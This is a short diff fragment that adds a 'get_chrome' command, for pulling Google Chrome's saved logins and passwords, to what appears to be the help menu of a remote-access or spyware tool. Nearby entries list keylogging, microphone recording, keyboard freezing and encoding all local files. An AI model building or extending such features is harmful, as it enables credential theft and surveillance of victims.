@@ -93,6 +93,7 @@ dns - display DNS Cache
 encode_all - encode ALL local files
 freeze_keyboard - enable keyboard freeze
 unfreeze_keyboard - disable keyboard freeze
+get_chrome - Get Google Chrome's login/passwords
 hear - record microphone
 ip_info - via ipinfo.io
 keylogs - get keylogs
